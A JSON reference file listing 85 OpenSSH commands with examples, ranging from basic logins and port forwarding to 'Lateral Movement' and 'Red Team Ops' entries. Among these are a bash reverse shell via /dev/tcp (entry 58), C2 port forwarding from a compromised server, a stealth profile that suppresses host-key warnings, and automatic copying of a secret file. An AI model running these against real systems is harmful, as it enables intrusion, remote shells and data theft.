@@ -1,0 +1,602 @@
+{
+    "tool": "ssh",
+    "description": "Complete OpenSSH command and workflow reference from basic to advanced remote access and lateral movement",
+    "total_commands": 85,
+    "commands": [
+        {
+            "id": 1,
+            "category": "Basic Remote Connection",
+            "command": "ssh user@192.168.1.10",
+            "example": "ssh user@192.168.1.10",
+            "explanation": "Establishes a basic interactive SSH session to a remote host using default settings."
+        },
+        {
+            "id": 2,
+            "category": "Basic Remote Connection",
+            "command": "ssh -l user 192.168.1.10",
+            "example": "ssh -l admin 192.168.1.10",
+            "explanation": "Connects to a remote host specifying the login username with the -l flag."
+        },
+        {
+            "id": 3,
+            "category": "Target Specification",
+            "command": "ssh user@example.com -p 2222",
+            "example": "ssh user@example.com -p 2222",
+            "explanation": "Connects to a remote server on a non-standard SSH port."
+        },
+        {
+            "id": 4,
+            "category": "Transport Options",
+            "command": "ssh -4 user@192.168.1.10",
+            "example": "ssh -4 user@192.168.1.10",
+            "explanation": "Forces the SSH client to use IPv4 addresses only."
+        },
+        {
+            "id": 5,
+            "category": "Transport Options",
+            "command": "ssh -6 user@example.com",
+            "example": "ssh -6 user@example.com",
+            "explanation": "Forces the SSH client to use IPv6 addresses only."
+        },
+        {
+            "id": 6,
+            "category": "Authentication Handling",
+            "command": "ssh -o PreferredAuthentications=password user@192.168.1.10",
+            "example": "ssh -o PreferredAuthentications=password user@192.168.1.10",
+            "explanation": "Forces the client to attempt password authentication, ignoring keys or agents."
+        },
+        {
+            "id": 7,
+            "category": "Authentication Handling",
+            "command": "ssh -o PreferredAuthentications=publickey user@192.168.1.10",
+            "example": "ssh -o PreferredAuthentications=publickey user@192.168.1.10",
+            "explanation": "Forces the client to use public key authentication only, failing if no key is accepted."
+        },
+        {
+            "id": 8,
+            "category": "Key-Based Authentication",
+            "command": "ssh -i ~/.ssh/id_rsa_custom user@192.168.1.10",
+            "example": "ssh -i ~/.ssh/deploy_key user@192.168.1.10",
+            "explanation": "Specifies a specific identity file (private key) to use for authentication."
+        },
+        {
+            "id": 9,
+            "category": "Key-Based Authentication",
+            "command": "ssh -i /path/to/key.pem -o IdentitiesOnly=yes user@192.168.1.10",
+            "example": "ssh -i ./aws-key.pem -o IdentitiesOnly=yes ubuntu@192.168.1.10",
+            "explanation": "Uses a specific key and prevents the SSH agent from offering other keys."
+        },
+        {
+            "id": 10,
+            "category": "Configuration Usage",
+            "command": "ssh -F /path/to/custom_config host_alias",
+            "example": "ssh -F ./project_config db_server",
+            "explanation": "Instructs SSH to use a custom configuration file instead of the default ~/.ssh/config."
+        },
+        {
+            "id": 11,
+            "category": "Command Execution",
+            "command": "ssh user@192.168.1.10 'whoami; id; hostname'",
+            "example": "ssh user@192.168.1.10 'ls -la /var/www'",
+            "explanation": "Executes a command string on the remote host and exits immediately after returning output."
+        },
+        {
+            "id": 12,
+            "category": "Session Control",
+            "command": "ssh -N -f user@192.168.1.10",
+            "example": "ssh -N -f user@192.168.1.10",
+            "explanation": "Goes into the background (-f) and executes no remote command (-N), useful for tunnel setup."
+        },
+        {
+            "id": 13,
+            "category": "Session Control",
+            "command": "ssh -T user@192.168.1.10",
+            "example": "ssh -T git@github.com",
+            "explanation": "Disables pseudo-terminal allocation, often used for scripts or file transfers."
+        },
+        {
+            "id": 14,
+            "category": "Session Control",
+            "command": "ssh -t user@192.168.1.10 'top'",
+            "example": "ssh -t user@192.168.1.10 'sudo htop'",
+            "explanation": "Forces pseudo-terminal allocation, allowing interactive programs like top or sudo to run."
+        },
+        {
+            "id": 15,
+            "category": "Output & Logging",
+            "command": "ssh -v user@192.168.1.10",
+            "example": "ssh -v user@192.168.1.10",
+            "explanation": "Enables verbose mode to print debugging messages about the connection progress."
+        },
+        {
+            "id": 16,
+            "category": "Output & Logging",
+            "command": "ssh -vvv user@192.168.1.10",
+            "example": "ssh -vvv user@192.168.1.10",
+            "explanation": "Enables maximum verbosity to debug complex connection, authentication, or config issues."
+        },
+        {
+            "id": 17,
+            "category": "Output & Logging",
+            "command": "ssh -q user@192.168.1.10 command",
+            "example": "ssh -q user@192.168.1.10 'uptime'",
+            "explanation": "Enables quiet mode, suppressing most warning and diagnostic messages."
+        },
+        {
+            "id": 18,
+            "category": "Output & Logging",
+            "command": "ssh -E /tmp/ssh_log.txt -v user@192.168.1.10",
+            "example": "ssh -E debug.log -v user@192.168.1.10",
+            "explanation": "Appends debug logs to a specific file instead of standard error."
+        },
+        {
+            "id": 19,
+            "category": "Connection Optimization",
+            "command": "ssh -C user@192.168.1.10",
+            "example": "ssh -C user@192.168.1.10",
+            "explanation": "Enables compression on the connection, useful for slow links or text-heavy transfers."
+        },
+        {
+            "id": 20,
+            "category": "Connection Optimization",
+            "command": "ssh -o ConnectTimeout=5 user@192.168.1.10",
+            "example": "ssh -o ConnectTimeout=5 user@192.168.1.10",
+            "explanation": "Sets a timeout limit in seconds for establishing the TCP connection."
+        },
+        {
+            "id": 21,
+            "category": "Connection Optimization",
+            "command": "ssh -o ServerAliveInterval=60 user@192.168.1.10",
+            "example": "ssh -o ServerAliveInterval=60 user@192.168.1.10",
+            "explanation": "Sends a keepalive packet every 60 seconds to prevent the session from timing out."
+        },
+        {
+            "id": 22,
+            "category": "Port Forwarding (Local)",
+            "command": "ssh -L 8080:localhost:80 user@192.168.1.10",
+            "example": "ssh -L 8080:127.0.0.1:80 user@192.168.1.10",
+            "explanation": "Forwards local port 8080 to port 80 on the remote host (Local Port Forwarding)."
+        },
+        {
+            "id": 23,
+            "category": "Port Forwarding (Local)",
+            "command": "ssh -L 8080:10.0.0.5:80 user@192.168.1.10",
+            "example": "ssh -L 8080:internal-db:5432 user@bastion",
+            "explanation": "Forwards local port 8080 through the remote host to a third internal IP address."
+        },
+        {
+            "id": 24,
+            "category": "Port Forwarding (Remote)",
+            "command": "ssh -R 8080:localhost:80 user@192.168.1.10",
+            "example": "ssh -R 8080:127.0.0.1:80 user@192.168.1.10",
+            "explanation": "Forwards port 8080 on the remote server back to port 80 on the local machine (Remote Port Forwarding)."
+        },
+        {
+            "id": 25,
+            "category": "Port Forwarding (Remote)",
+            "command": "ssh -R 0.0.0.0:8080:localhost:80 user@192.168.1.10",
+            "example": "ssh -R 0.0.0.0:8080:127.0.0.1:80 user@public-vps",
+            "explanation": "Exposes the reverse forwarded port 8080 on all interfaces of the remote host (requires GatewayPorts yes)."
+        },
+        {
+            "id": 26,
+            "category": "Port Forwarding (Dynamic)",
+            "command": "ssh -D 9050 user@192.168.1.10",
+            "example": "ssh -D 9050 -N -f user@192.168.1.10",
+            "explanation": "Creates a dynamic SOCKS proxy on local port 9050 that routes traffic through the SSH connection."
+        },
+        {
+            "id": 27,
+            "category": "X11 Forwarding",
+            "command": "ssh -X user@192.168.1.10",
+            "example": "ssh -X user@192.168.1.10",
+            "explanation": "Enables X11 forwarding, allowing remote GUI applications to be displayed locally."
+        },
+        {
+            "id": 28,
+            "category": "X11 Forwarding",
+            "command": "ssh -Y user@192.168.1.10",
+            "example": "ssh -Y user@192.168.1.10",
+            "explanation": "Enables trusted X11 forwarding, bypassing some X11 security checks."
+        },
+        {
+            "id": 29,
+            "category": "Host Key Management",
+            "command": "ssh -o StrictHostKeyChecking=no user@192.168.1.10",
+            "example": "ssh -o StrictHostKeyChecking=no user@192.168.1.10",
+            "explanation": "Automatically accepts new host keys without prompting the user."
+        },
+        {
+            "id": 30,
+            "category": "Host Key Management",
+            "command": "ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.1.10",
+            "example": "ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.1.10",
+            "explanation": "Completely ignores known_hosts and accepts all keys, useful for ephemeral lab targets."
+        },
+        {
+            "id": 31,
+            "category": "Jump Hosts",
+            "command": "ssh -J jumpuser@jumphost user@192.168.1.20",
+            "example": "ssh -J admin@bastion.corp.com developer@internal-app",
+            "explanation": "Uses the -J flag to transparently proxy the connection through an intermediate jump host."
+        },
+        {
+            "id": 32,
+            "category": "Jump Hosts",
+            "command": "ssh -J user1@host1,user2@host2 user@target",
+            "example": "ssh -J entry@bastion1,internal@bastion2 root@deep-target",
+            "explanation": "Chains multiple jump hosts in sequence to reach a deep internal network target."
+        },
+        {
+            "id": 33,
+            "category": "Proxy Command",
+            "command": "ssh -o ProxyCommand='ssh -W %h:%p user@jumphost' user@target",
+            "example": "ssh -o ProxyCommand='ssh -W %h:%p jumpuser@1.2.3.4' user@10.0.0.5",
+            "explanation": "Legacy method to proxy connections using netcat-style forwarding via an intermediate host."
+        },
+        {
+            "id": 34,
+            "category": "Proxy Command",
+            "command": "ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:9050 %h %p' user@target",
+            "example": "ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:9050 %h %p' user@hidden",
+            "explanation": "Routes the SSH connection through a local SOCKS5 proxy (e.g., Tor or another SSH tunnel)."
+        },
+        {
+            "id": 35,
+            "category": "Agent Forwarding",
+            "command": "ssh -A user@192.168.1.10",
+            "example": "ssh -A user@192.168.1.10",
+            "explanation": "Forwards the local SSH authentication agent to the remote host, allowing subsequent hops."
+        },
+        {
+            "id": 36,
+            "category": "Agent Forwarding",
+            "command": "ssh -a user@192.168.1.10",
+            "example": "ssh -a user@192.168.1.10",
+            "explanation": "Explicitly disables agent forwarding to prevent credential theft risks on the remote host."
+        },
+        {
+            "id": 37,
+            "category": "Multiplexing",
+            "command": "ssh -M -S /tmp/ssh_mux_%r@%h:%p user@192.168.1.10",
+            "example": "ssh -M -S /tmp/mysocket user@192.168.1.10",
+            "explanation": "Establishes a master connection socket for connection multiplexing (-M) at a specific path (-S)."
+        },
+        {
+            "id": 38,
+            "category": "Multiplexing",
+            "command": "ssh -S /tmp/ssh_mux_%r@%h:%p user@192.168.1.10 command",
+            "example": "ssh -S /tmp/mysocket user@192.168.1.10 'uptime'",
+            "explanation": "Reuses an existing master connection socket to execute commands instantly without re-authentication."
+        },
+        {
+            "id": 39,
+            "category": "Multiplexing",
+            "command": "ssh -O check -S /tmp/ssh_mux_%r@%h:%p user@192.168.1.10",
+            "example": "ssh -O check -S /tmp/mysocket user@192.168.1.10",
+            "explanation": "Checks the status of an active multiplexed control socket."
+        },
+        {
+            "id": 40,
+            "category": "Multiplexing",
+            "command": "ssh -O exit -S /tmp/ssh_mux_%r@%h:%p user@192.168.1.10",
+            "example": "ssh -O exit -S /tmp/mysocket user@192.168.1.10",
+            "explanation": "Gracefully closes the master multiplexing connection and socket."
+        },
+        {
+            "id": 41,
+            "category": "Security & Encryption",
+            "command": "ssh -c aes256-gcm@openssh.com user@192.168.1.10",
+            "example": "ssh -c aes256-gcm@openssh.com user@192.168.1.10",
+            "explanation": "Forces the connection to use a specific encryption cipher."
+        },
+        {
+            "id": 42,
+            "category": "Security & Encryption",
+            "command": "ssh -m hmac-sha2-512 user@192.168.1.10",
+            "example": "ssh -m hmac-sha2-512 user@192.168.1.10",
+            "explanation": "Forces the connection to use a specific Message Authentication Code (MAC) algorithm."
+        },
+        {
+            "id": 43,
+            "category": "Security & Encryption",
+            "command": "ssh -o KexAlgorithms=curve25519-sha256 user@192.168.1.10",
+            "example": "ssh -o KexAlgorithms=curve25519-sha256 user@192.168.1.10",
+            "explanation": "Specifies the Key Exchange (KEX) algorithms the client will propose."
+        },
+        {
+            "id": 44,
+            "category": "Security & Encryption",
+            "command": "ssh -o HostKeyAlgorithms=+ssh-rsa user@legacy-host",
+            "example": "ssh -o HostKeyAlgorithms=+ssh-rsa user@192.168.1.5",
+            "explanation": "Enables legacy host key algorithms (like ssh-rsa) for connecting to outdated servers."
+        },
+        {
+            "id": 45,
+            "category": "File Transfer (SCP)",
+            "command": "scp localfile.txt user@192.168.1.10:/tmp/",
+            "example": "scp exploit.py user@192.168.1.10:/tmp/",
+            "explanation": "Securely copies a local file to a remote destination."
+        },
+        {
+            "id": 46,
+            "category": "File Transfer (SCP)",
+            "command": "scp -r folder/ user@192.168.1.10:/tmp/",
+            "example": "scp -r tools/ user@192.168.1.10:/opt/",
+            "explanation": "Recursively copies a local directory and its contents to a remote destination."
+        },
+        {
+            "id": 47,
+            "category": "File Transfer (SCP)",
+            "command": "scp -P 2222 user@192.168.1.10:/remote/file.txt .",
+            "example": "scp -P 2222 user@192.168.1.10:/etc/passwd .",
+            "explanation": "Downloads a file from a remote host listening on a non-standard port."
+        },
+        {
+            "id": 48,
+            "category": "File Transfer (SFTP)",
+            "command": "sftp user@192.168.1.10",
+            "example": "sftp user@192.168.1.10",
+            "explanation": "Starts an interactive Secure File Transfer Protocol session."
+        },
+        {
+            "id": 49,
+            "category": "File Transfer (SFTP)",
+            "command": "sftp -b batchfile.txt user@192.168.1.10",
+            "example": "sftp -b commands.sftp user@192.168.1.10",
+            "explanation": "Runs SFTP in batch mode, executing commands listed in a file non-interactively."
+        },
+        {
+            "id": 50,
+            "category": "Advanced Configuration",
+            "command": "ssh -o BatchMode=yes user@192.168.1.10",
+            "example": "ssh -o BatchMode=yes user@192.168.1.10 'date'",
+            "explanation": "Disables all interactive prompts (passwords, key confirmations), useful for scripts."
+        },
+        {
+            "id": 51,
+            "category": "Advanced Configuration",
+            "command": "ssh -o EscapeChar=none user@192.168.1.10",
+            "example": "ssh -o EscapeChar=none user@192.168.1.10",
+            "explanation": "Disables the escape character (default ~), allowing transparent binary data transfer."
+        },
+        {
+            "id": 52,
+            "category": "Advanced Configuration",
+            "command": "ssh -e ^ user@192.168.1.10",
+            "example": "ssh -e ^ user@192.168.1.10",
+            "explanation": "Sets the session escape character to the caret symbol (^) instead of tilde (~)."
+        },
+        {
+            "id": 53,
+            "category": "Lateral Movement",
+            "command": "ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o LogLevel=ERROR user@192.168.1.10",
+            "example": "ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o LogLevel=ERROR user@192.168.1.10",
+            "explanation": "A stealthy connection profile that ignores host keys and suppresses warnings for red team ops."
+        },
+        {
+            "id": 54,
+            "category": "Lateral Movement",
+            "command": "ssh -L 8080:127.0.0.1:80 -N user@192.168.1.10",
+            "example": "ssh -L 8080:127.0.0.1:80 -N user@192.168.1.10",
+            "explanation": "Establishes a background tunnel to access a remote localhost service (like an admin panel) locally."
+        },
+        {
+            "id": 55,
+            "category": "Lateral Movement",
+            "command": "ssh -R 1234:127.0.0.1:4444 user@192.168.1.10",
+            "example": "ssh -R 1234:127.0.0.1:4444 user@compromised-server",
+            "explanation": "Remote forwards a port on the compromised server back to a local C2 listener."
+        },
+        {
+            "id": 56,
+            "category": "Lateral Movement",
+            "command": "ssh -D 1080 -f -C -q -N user@192.168.1.10",
+            "example": "ssh -D 1080 -f -C -q -N user@192.168.1.10",
+            "explanation": "Backgrounds a compressed, quiet dynamic SOCKS proxy for pivoting tools like proxychains."
+        },
+        {
+            "id": 57,
+            "category": "Lateral Movement",
+            "command": "ssh -o ProxyCommand='ssh -W %h:%p user@pivot' user@target",
+            "example": "ssh -o ProxyCommand='ssh -W %h:%p pivot-user@10.0.0.1' root@10.0.0.2",
+            "explanation": "Manual double-hop lateral movement using ProxyCommand when -J is unavailable."
+        },
+        {
+            "id": 58,
+            "category": "Lateral Movement",
+            "command": "ssh user@192.168.1.10 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'",
+            "example": "ssh user@192.168.1.10 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'",
+            "explanation": "Executes a reverse shell command immediately upon connection."
+        },
+        {
+            "id": 59,
+            "category": "Lateral Movement",
+            "command": "ssh -o PermitLocalCommand=yes -o LocalCommand='xterm' user@192.168.1.10",
+            "example": "ssh -o PermitLocalCommand=yes -o LocalCommand='scp %r@%h:secret.txt .' user@192.168.1.10",
+            "explanation": "Executes a local command automatically after a successful connection is established."
+        },
+        {
+            "id": 60,
+            "category": "Tunneling & VPN",
+            "command": "ssh -w 0:0 user@192.168.1.10",
+            "example": "ssh -w 0:0 root@192.168.1.10",
+            "explanation": "Creates a Layer 3 TUN device tunnel (requires root on both ends and PermitTunnel yes)."
+        },
+        {
+            "id": 61,
+            "category": "Tunneling & VPN",
+            "command": "ssh -w 5:5 -o Tunnel=ethernet user@192.168.1.10",
+            "example": "ssh -w 5:5 -o Tunnel=ethernet root@192.168.1.10",
+            "explanation": "Creates a Layer 2 TAP device tunnel for bridging Ethernet segments."
+        },
+        {
+            "id": 62,
+            "category": "Authentication Debugging",
+            "command": "ssh -v -o PubkeyAuthentication=no user@192.168.1.10",
+            "example": "ssh -v -o PubkeyAuthentication=no user@192.168.1.10",
+            "explanation": "Debugs authentication failures by forcing a fallback to password or keyboard-interactive modes."
+        },
+        {
+            "id": 63,
+            "category": "Key Generation (Support)",
+            "command": "ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -C 'comment'",
+            "example": "ssh-keygen -t ed25519 -f ~/.ssh/ops_key -C 'ops-team'",
+            "explanation": "Generates a modern Ed25519 SSH key pair for secure authentication."
+        },
+        {
+            "id": 64,
+            "category": "Key Management (Support)",
+            "command": "ssh-keygen -R 192.168.1.10",
+            "example": "ssh-keygen -R 192.168.1.10",
+            "explanation": "Removes a specific host key from the known_hosts file to resolve man-in-the-middle warnings."
+        },
+        {
+            "id": 65,
+            "category": "Key Management (Support)",
+            "command": "ssh-copy-id -i ~/.ssh/id_ed25519.pub user@192.168.1.10",
+            "example": "ssh-copy-id -i ~/.ssh/ops_key.pub user@192.168.1.10",
+            "explanation": "Installs a public key onto a remote server's authorized_keys file."
+        },
+        {
+            "id": 66,
+            "category": "Key Management (Support)",
+            "command": "ssh-keygen -y -f private_key.pem > public_key.pub",
+            "example": "ssh-keygen -y -f id_rsa > id_rsa.pub",
+            "explanation": "Derives the public key from a private key file."
+        },
+        {
+            "id": 67,
+            "category": "Key Management (Support)",
+            "command": "ssh-keygen -p -f ~/.ssh/id_rsa",
+            "example": "ssh-keygen -p -f ~/.ssh/id_rsa",
+            "explanation": "Changes the passphrase of an existing private key without regenerating the key."
+        },
+        {
+            "id": 68,
+            "category": "Red Team Ops",
+            "command": "ssh -o ControlPath=~/.ssh/%r@%h:%p -o ControlMaster=auto -o ControlPersist=10m user@192.168.1.10",
+            "example": "ssh -o ControlPath=/tmp/%r -o ControlMaster=auto -o ControlPersist=yes user@192.168.1.10",
+            "explanation": "Maintains a persistent background connection socket to speed up subsequent lateral movement commands."
+        },
+        {
+            "id": 69,
+            "category": "Red Team Ops",
+            "command": "ssh -o SendEnv=GIT_* user@192.168.1.10",
+            "example": "ssh -o SendEnv=MY_VAR user@192.168.1.10",
+            "explanation": "Passes specific local environment variables to the remote session (requires AcceptEnv on server)."
+        },
+        {
+            "id": 70,
+            "category": "Red Team Ops",
+            "command": "ssh -t user@192.168.1.10 'screen -R malicious_session'",
+            "example": "ssh -t user@192.168.1.10 'tmux attach -t session'",
+            "explanation": "Connects and immediately attaches to a persistent terminal multiplexer session."
+        },
+        {
+            "id": 71,
+            "category": "Defensive Validation",
+            "command": "ssh -G user@192.168.1.10",
+            "example": "ssh -G user@192.168.1.10",
+            "explanation": "Prints the full resolved configuration for a host connection without actually connecting."
+        },
+        {
+            "id": 72,
+            "category": "Defensive Validation",
+            "command": "ssh -Q cipher",
+            "example": "ssh -Q cipher",
+            "explanation": "Lists all encryption ciphers supported by the local SSH client."
+        },
+        {
+            "id": 73,
+            "category": "Defensive Validation",
+            "command": "ssh -Q mac",
+            "example": "ssh -Q mac",
+            "explanation": "Lists all Message Authentication Code (MAC) algorithms supported by the client."
+        },
+        {
+            "id": 74,
+            "category": "Defensive Validation",
+            "command": "ssh -Q kex",
+            "example": "ssh -Q kex",
+            "explanation": "Lists all Key Exchange (KEX) algorithms supported by the client."
+        },
+        {
+            "id": 75,
+            "category": "Certificate Authentication",
+            "command": "ssh -o CertificateFile=id_rsa-cert.pub user@192.168.1.10",
+            "example": "ssh -o CertificateFile=~/.ssh/id_user-cert.pub user@192.168.1.10",
+            "explanation": "Authenticates using a signed SSH certificate instead of a raw public key."
+        },
+        {
+            "id": 76,
+            "category": "Agent Management",
+            "command": "ssh-add -l",
+            "example": "ssh-add -l",
+            "explanation": "Lists fingerprints of all identities currently loaded into the SSH agent."
+        },
+        {
+            "id": 77,
+            "category": "Agent Management",
+            "command": "ssh-add -D",
+            "example": "ssh-add -D",
+            "explanation": "Deletes all identities from the current SSH agent."
+        },
+        {
+            "id": 78,
+            "category": "Agent Management",
+            "command": "ssh-add -c ~/.ssh/id_rsa",
+            "example": "ssh-add -c ~/.ssh/sensitive_key",
+            "explanation": "Adds a key to the agent with constraints, requiring confirmation for each use."
+        },
+        {
+            "id": 79,
+            "category": "Agent Management",
+            "command": "ssh-add -t 3600 ~/.ssh/id_rsa",
+            "example": "ssh-add -t 3600 ~/.ssh/id_rsa",
+            "explanation": "Adds a key to the agent with a lifetime limit (e.g., 1 hour), after which it is removed."
+        },
+        {
+            "id": 80,
+            "category": "Legacy/Insecure",
+            "command": "ssh -1 user@192.168.1.10",
+            "example": "ssh -1 user@old-router",
+            "explanation": "Forces SSH protocol version 1 (highly insecure, removed in modern OpenSSH)."
+        },
+        {
+            "id": 81,
+            "category": "Advanced Workflow",
+            "command": "ssh -o StreamLocalBindUnlink=yes -R /tmp/socket:/tmp/socket user@host",
+            "example": "ssh -o StreamLocalBindUnlink=yes -R /run/docker.sock:/run/docker.sock user@dev",
+            "explanation": "Forwards a Unix domain socket from the remote host to the local machine, cleaning up stale sockets."
+        },
+        {
+            "id": 82,
+            "category": "Advanced Workflow",
+            "command": "ssh -t user@jump ssh -t user@target",
+            "example": "ssh -t user@bastion ssh -t user@db-server",
+            "explanation": "Manual chain loading of SSH sessions where -J is not supported or shell interaction is needed at each hop."
+        },
+        {
+            "id": 83,
+            "category": "Advanced Workflow",
+            "command": "ssh -o RemoteCommand='ls -la' user@192.168.1.10",
+            "example": "ssh -o RemoteCommand='uptime' user@192.168.1.10",
+            "explanation": "Specifies the command to execute on the remote host via the configuration option rather than argument."
+        },
+        {
+            "id": 84,
+            "category": "Advanced Workflow",
+            "command": "ssh -o IPQoS=throughput user@192.168.1.10",
+            "example": "ssh -o IPQoS=throughput user@192.168.1.10",
+            "explanation": "Optimizes the Quality of Service (QoS) flags for high-throughput bulk data transfer."
+        },
+        {
+            "id": 85,
+            "category": "Advanced Workflow",
+            "command": "ssh -o IPQoS=lowdelay user@192.168.1.10",
+            "example": "ssh -o IPQoS=lowdelay user@192.168.1.10",
+            "explanation": "Optimizes QoS flags for low-latency interactive sessions."
+        }
+    ]
+}
